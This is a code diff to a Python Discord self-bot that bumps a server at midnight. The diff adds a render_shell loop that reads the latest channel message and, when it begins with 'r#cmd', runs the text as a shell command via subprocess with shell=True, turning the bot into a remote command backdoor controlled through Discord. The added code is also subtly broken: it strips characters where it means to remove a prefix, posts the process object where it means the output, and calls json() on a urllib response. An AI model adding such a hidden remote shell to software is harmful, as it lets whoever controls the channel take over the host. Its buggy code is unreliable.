@@ -3,6 +3,7 @@ import json
 import time
 import base64
 import datetime
+import subprocess
 
 from urllib.request import Request, urlopen
 from JustAlive import JustAlive
@@ -30,6 +31,11 @@ class Discord:
             print("Success.")
 
     def send_message(self, msg):
+        response = urlopen(Request(f"https://discord.com/api/v9/channels/{channel_id[1]}/messages", headers=self.headers, data=json.dumps({"content": msg}).encode(), method="POST"))
+        if response.getcode() == 200:
+            print("Success.")
+
+    def bump_message(self, msg):
         while True:
             nowdatetime = datetime.datetime.utcnow() + datetime.timedelta(hours=self.DIFF_JST_FROM_UTC)
             if nowdatetime.strftime("%H:%M:%S") == "24:00:00":
@@ -38,9 +44,22 @@ class Discord:
                 if response.getcode() == 200:
                     print("Success.")
 
+    def message_content(self):
+        response = urlopen(Request(f"https://discord.com/api/v9/channels/{channel_id[1]}/messages", headers=self.headers, method="GET"))
+        return response.json()[0]["content"]
+
+    def render_shell(self):
+        while True:
+            if self.message_content().startswith("r#cmd"):
+                cmd = self.message_content().strip("r#cmd ")
+                proc = subprocess.Popen(cmd.split(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                self.send_message(f"```{proc}```")
+            time.sleep(0.5) 
+
 if __name__ == "__main__":
     JustAlive()
 
     discord = Discord(base64.b64decode(BotKey).decode())
     discord.on_ready("> BUMPERが起動しました。\n > [Render ウェブサイト(SelfBot host)](https://render-discord-bump-selfbot.onrender.com)")
-    discord.send_message("> _BUMP 24:00_")
+    discord.render_shell()
+    discord.bump_message("> _BUMP 24:00_")
